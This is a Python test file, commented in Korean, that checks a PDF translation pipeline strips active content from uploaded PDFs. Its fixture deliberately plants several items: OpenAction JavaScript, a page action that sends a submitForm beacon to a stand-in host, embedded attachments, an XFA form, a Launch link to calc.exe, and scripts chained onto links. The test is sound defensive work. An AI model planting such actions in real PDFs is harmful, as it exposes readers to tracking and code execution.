"""번역 PDF는 업로드 원본의 능동 콘텐츠를 싣지 않는다 (감사 security-3).

단일 보기 번역 PDF는 원본을 열어 텍스트만 바꿔 저장해, 원본의 /OpenAction JavaScript·문서
JavaScript·페이지 /AA(this.submitForm 비컨)·첨부 파일·Launch 링크가 그대로 다른 사용자에게
갔다. 내부 이동·URI 링크·목차처럼 읽기에 필요한 것은 그대로 둔다.
"""

from __future__ import annotations

import fitz

from app.pipeline.pdf_export import build_dual_pdf, build_translated_pdf

from tests.test_pdf_export import KO_TEXT, _unit_job

_JS = "<</S/JavaScript/JS(app.alert('p5-active'))>>"
_BEACON = "<</S/JavaScript/JS(this.submitForm('http://p5-beacon.invalid/aa'))>>"


def _arm_source(job_dir) -> None:
    """_unit_job의 source.pdf에 능동 콘텐츠를 심는다(텍스트·기하는 그대로)."""
    src = job_dir / "source.pdf"
    staged = job_dir / "armed.pdf"
    doc = fitz.open(src)
    page = doc[0]
    cat = doc.pdf_catalog()
    doc.xref_set_key(cat, "OpenAction", _JS)
    doc.embfile_add("payload.txt", b"bait attachment", filename="payload.txt")
    doc.xref_set_key(cat, "Names/JavaScript", "<</Names [(p5) " + _JS + "]>>")
    doc.xref_set_key(cat, "AcroForm", "<</Fields [] /XFA (<xdp:xdp/>)>>")
    doc.xref_set_key(cat, "PageMode", "/UseAttachments")
    doc.xref_set_key(page.xref, "AA", "<</O " + _BEACON + ">>")
    page.add_file_annot(fitz.Point(40, 40), b"second bait", "bait.txt")
    page.insert_link({"kind": fitz.LINK_LAUNCH, "from": fitz.Rect(40, 600, 140, 620),
                      "file": "calc.exe"})
    page.insert_link({"kind": fitz.LINK_URI, "from": fitz.Rect(40, 640, 140, 660),
                      "uri": "https://doi.org/10.1000/p5"})
    for y in (680, 720):  # 내부 이동 둘 — 아래 것에는 /Next로 JavaScript를 사슬로 단다
        page.insert_link({"kind": fitz.LINK_GOTO, "from": fitz.Rect(40, y, 140, y + 20),
                          "page": 0, "to": fitz.Point(0, 0)})
    doc.set_toc([[1, "Intro", 1]])
    doc.save(staged)
    doc.close()
    doc = fitz.open(staged)
    page = doc[0]
    links = [link for link in page.get_links() if link.get("xref")]
    lowest = max(links, key=lambda link: link["from"].y0)["xref"]
    doc.xref_set_key(lowest, "A/Next", _JS)
    first_item = doc.xref_get_key(doc.pdf_catalog(), "Outlines/First")[1].split()[0]
    doc.xref_set_key(int(first_item), "A", _JS)  # 목차 항목을 누르면 도는 스크립트
    doc.save(src)
    doc.close()
    staged.unlink()


def _all_objects(path) -> str:
    doc = fitz.open(path)
    try:
        return "\n".join(doc.xref_object(x) for x in range(1, doc.xref_length()))
    finally:
        doc.close()


def test_translated_pdf_drops_scripts_actions_and_attachments(tmp_path):
    job_dir = _unit_job(tmp_path)
    _arm_source(job_dir)
    armed = _all_objects(job_dir / "source.pdf")
    for marker in ("app.alert", "submitForm", "/Launch", "/EmbeddedFiles", "/XFA",
                   "/FileAttachment", "/Next"):
        assert marker in armed, marker                          # 픽스처가 실제로 심었다

    result = build_translated_pdf(job_dir, "ko")
    doc = fitz.open(result.path)
    try:
        page = doc[0]
        assert KO_TEXT[:6] in page.get_text().replace("\n", "")  # 번역은 그대로 들어간다
        cat = doc.pdf_catalog()
        assert doc.xref_get_key(cat, "OpenAction")[0] == "null"
        assert doc.xref_get_key(cat, "Names/JavaScript")[0] == "null"
        assert doc.xref_get_key(cat, "Names/EmbeddedFiles")[0] == "null"
        assert doc.xref_get_key(cat, "AcroForm/XFA")[0] == "null"
        assert doc.xref_get_key(cat, "PageMode")[0] == "null"
        assert doc.embfile_count() == 0
        assert doc.xref_get_key(page.xref, "AA")[0] == "null"
        kinds = sorted(link["kind"] for link in page.get_links())
        uris = [link.get("uri") for link in page.get_links() if link["kind"] == fitz.LINK_URI]
        assert uris == ["https://doi.org/10.1000/p5"]            # 인용 링크는 남는다
        assert fitz.LINK_LAUNCH not in kinds
        assert kinds.count(fitz.LINK_GOTO) >= 1                 # 내부 이동도 남는다
        assert [item[1] for item in doc.get_toc()] == ["Intro"]  # 목차 항목은 남는다(동작만 지움)
        for annot in page.annots(types=[fitz.PDF_ANNOT_FILE_ATTACHMENT]):
            assert doc.xref_get_key(annot.xref, "FS")[0] == "null"  # 첨부 아이콘만 남고 파일은 없다
    finally:
        doc.close()
    exported = _all_objects(result.path)
    for marker in ("JavaScript", "app.alert", "submitForm", "/Launch", "calc.exe",
                   "/EmbeddedFile", "/XFA"):
        assert marker not in exported, marker


def test_destination_open_action_and_plain_links_are_kept(tmp_path):
    """목적지(배열)로 연 페이지 지정은 동작이 아니다 — 지우지 않는다."""
    job_dir = _unit_job(tmp_path)
    src = job_dir / "source.pdf"
    doc = fitz.open(src)
    doc.xref_set_key(doc.pdf_catalog(), "OpenAction", f"[{doc[0].xref} 0 R /Fit]")
    doc.saveIncr()
    doc.close()
    result = build_translated_pdf(job_dir, "ko")
    doc = fitz.open(result.path)
    try:
        kind, value = doc.xref_get_key(doc.pdf_catalog(), "OpenAction")
        assert kind == "array" and "/Fit" in value
    finally:
        doc.close()


def test_dual_view_stays_free_of_active_content(tmp_path):
    job_dir = _unit_job(tmp_path)
    _arm_source(job_dir)
    translated = build_translated_pdf(job_dir, "ko")
    dual = build_dual_pdf(job_dir / "source.pdf", translated.path, job_dir / "export.ko.dual.pdf")
    exported = _all_objects(dual)
    for marker in ("JavaScript", "submitForm", "/Launch", "/EmbeddedFile"):
        assert marker not in exported, marker
